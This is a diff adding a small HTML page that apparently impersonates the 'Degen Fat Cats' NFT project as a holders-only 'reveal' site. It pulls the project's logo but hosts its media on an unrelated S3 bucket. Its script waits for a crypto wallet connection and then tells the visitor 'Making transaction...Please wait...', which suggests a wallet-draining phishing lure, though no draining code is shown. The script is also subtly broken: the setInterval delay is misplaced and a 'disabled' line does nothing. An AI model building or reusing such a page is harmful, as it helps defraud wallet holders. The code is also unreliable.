@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+   <head>
+
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>Degen Fat Cats | Reveal</title>
+      <link href="https://degenfatcats.com/logo192.png" rel="apple-touch-icon">
+      <link rel="icon" type="image/x-icon" href="https://degenfatcats.com/logo192.png">
+   </head>
+   <body>
+      <video autoplay muted loop id="myVideo">
+         <source src="https://glorious-hammers.s3.us-east-2.amazonaws.com/videos/banner-notext.mp4" type="video/mp4">
+       </video>
+       <img src="https://i.imgur.com/C4Q7ePY.gif" style="position: absolute; bottom:0; left: 30px; height: 130px;">
+      <div class="content">
+         <img src="https://i.imgur.com/8yVhoWf.png" style="height: 200px;margin-top: 70px;">
+         <div id="root" style="margin-top: 100px;"></div>
+         <p style="color:white;margin-top: 50px;font-size: 20px;letter-spacing: 3px;">Reveal your Degen Fat Cat<br><br>Only for holders</p>
+      </div>
+   </body>
+   <script>
+      function main() {
+         if (document.getElementsByClassName('upgrade2')[0].innerHTML.includes('<i class="wallet-adapter-button-start-icon">') == true) {
+            document.getElementsByClassName('upgrade')[0].addEventListener("click", function() {
+            document.querySelector("body > p").innerHTML = "Making transaction...Please wait...";
+            document.getElementsByClassName('upgrade')[0].disabled
+      })}};
+      setInterval(() => main()), 500;
+   </script>
+</html>
